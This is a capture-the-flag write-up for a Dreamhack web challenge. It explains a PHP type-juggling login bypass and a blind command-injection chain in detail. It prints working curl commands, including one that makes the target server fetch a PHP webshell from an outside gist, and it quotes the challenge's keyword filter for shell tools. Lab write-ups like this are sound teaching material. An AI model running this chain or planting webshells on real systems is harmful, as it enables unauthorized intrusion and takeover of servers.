---
title: "Dreamhack: Switching Command"
date: 2025-08-15
tags:
  - web
  - ctf
  - phptypejuggling
draft: false
---
##### Link : [Switching Command](https://dreamhack.io/wargame/challenges/1081)

##### Description
```
Not Friendly service... Can you switching the command?
```

# Solve

A simple web service with just a login form. I'll document the process of how I dissected the source code to gain admin privileges and ultimately execute system commands to capture the flag.

### Finding the Foothold

In the initial analysis phase, the first file that caught my eye was `index.php`. I expected it to contain the core logic for handling user input. And indeed, this file held the crucial clue.

Looking at the code, it was processing the `$_POST["username"]` parameter with the `json_decode` function, which seemed unconventional for standard form handling. Just below that, two different validation logics stood out.

```php title="index.php"
// ...
$username = $data->username;

// 1. Strict Comparison with ===
if($username === "admin" ){
    exit("no hack");
}

// 2. Loose Comparison inside a switch statement
switch($username){
    case "admin":
        // ... admin login logic
        break;
    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
// ...
```

The first `if` statement uses a **strict comparison (`===`)**, which checks both type and value, to block the string 'admin'. However, the second `switch` statement uses a **loose comparison (`==`)**, which allows for type conversion. This difference between the two comparison methods was the foothold for this challenge. I was confident that I could use PHP's Type Juggling to bypass the `if` check while still being recognized as 'admin' in the `switch` statement.

The actual page that I encounter when accessing the url is a simple page requiring user input.

![[Switching_Command-20250815132652562.png]]

If I skip this part and directly access to `/test.php`, it responds with "Authorization first" message.

![[Switching_Command-20250815132959232.png]]



## Planning the Attack

With the foothold found, it was time to devise a concrete attack plan. I decided on a two-step approach.

1. **Authentication Bypass**: Obtain an admin session via Type Juggling.
2. **Command Execution**: Use the acquired session to access `test.php`, bypass its filters, and execute the flag binary.

#### Step 1: Planning the Auth Bypass

In PHP, `true == "admin"` evaluates to `true` because the string "admin" is converted to the boolean `true`. However, `true === "admin"` is `false` because their types are different. I decided to leverage this.

By sending a JSON string like `{"username": true}` in the `username` parameter, the `$username` variable would hold the boolean value `true`. This would bypass the `if` statement and allow entry into the 'admin' case of the `switch`.

However, the code in the `case "admin":` block required a successful database query to grant an admin session.

```php title="index.php"
// ...
case "admin":
    $user = "admin";
    $password = "***REDACTED***"; // The password is redacted.
    $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    // ...
    if ($result -> num_rows == 1){ // The query must succeed.
        $_SESSION["auth"] = "admin";
        header("Location: test.php");
    } 
// ...
```

This is where the contents of the `init.sql` file were decisive.

```sql title="init.sql"
INSERT INTO users (username, password) values ('admin', '***REDACTED***');
```

The password for the admin user stored in the database was not a hidden secret but the literal string `'***REDACTED***'`. It perfectly matched the code in `index.php`. This confirmed that the type juggling attack would be 100% successful.

#### Step 2: Planning Command Execution

Once I had the admin session, I could execute commands on `test.php`. But there were two obstacles here as well.

```php title="test.php"
// ...
// 1. Keyword Filtering
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';
if (preg_match($pattern, $sanitized_command)){
    exit("No hack");
}

// As admin, the result is stored in the $resulttt variable.
if($_SESSION["auth"] === "admin"){
    //...
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
//...
// In the HTML output, the wrong variable, $result, is used.
echo "<pre>$result</pre>";
```

The command's output is stored in `$resulttt`, but the page echoes `$result`. This meant that **we would never see the output** of any command we ran as admin. This was a classic **Blind Remote Code Execution (RCE)** vulnerability.

In such a situation, the most stable strategy is to establish a proper channel for interaction. Therefore, my plan was revised: use the blind RCE to download a webshell onto the server, and then use that webshell to capture the flag.



## Execution

Now, it was time to put the plan into action.

First, I used Burp Suite or `curl` to send a POST request to `index.php` with the type juggling payload.

```bash
curl -X POST \
  http://host8.dreamhack.games:17130/index.php \
  -d 'username={"username":true}' \
  --cookie-jar cookies.txt
```

This request saved the `PHPSESSID` cookie (with admin privileges) into the `cookies.txt` file.

![[Switching_Command-20250815133731253.png]]

Next, using the acquired session cookie, I sent a `curl` command to `test.php` to download a simple PHP webshell to the server. I wouldn't see any output, but if there were no errors, the `webshell.php` file should have been created.

```bash
curl "http://host8.dreamhack.games:17130/test.php?cmd=curl%20%27https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%27%20-o%20webshell.php" \ --cookie cookies.txt
```

Finally, I accessed the uploaded `webshell.php` file directly in my browser.

![[Switching_Command-20250815135038254.png]]

From the webshell interface, I ran `ls -al` and saw the `/flag` executable. Executing `/flag` finally revealed the flag.

![[Switching_Command-20250815135114823.png]]

I got the flag!